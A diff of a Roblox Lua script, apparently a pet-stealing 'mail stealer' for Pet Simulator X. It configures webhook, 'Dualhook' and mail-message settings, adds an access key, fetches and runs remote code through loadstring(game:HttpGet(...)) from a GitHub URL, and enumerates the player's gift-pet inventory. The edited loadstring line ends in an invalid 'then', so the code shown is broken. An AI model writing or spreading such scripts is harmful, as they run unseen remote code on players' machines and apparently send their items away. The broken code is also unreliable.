@@ -1,7 +1,8 @@
  getgenv().Settings = {
+    PremiumKey = "rizzhub-LQOIpi8RuiFDqZ85hgwz",
     Webhook = false, -- By Making This True The Users Of Your Script Will Be Able
     -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
-    MailMessage = ".gg/Monzhub",
+    MailMessage = "Monz Better",
   Titanics = {
        Dualhook = false,
        Intensity = 100--%
@@ -40,10 +41,8 @@
   }
 }
     
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Petsimguiss", true))()
-
---// Exclusive info
-local Exclusive = 0
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Petsimguiss", true))() then
+  local Exclusive = 0
 
 for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
     if v:IsA("TextButton") then
@@ -53,7 +52,6 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
             end
 	end
 
---// Event Info
 local Event = 0
 
 for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
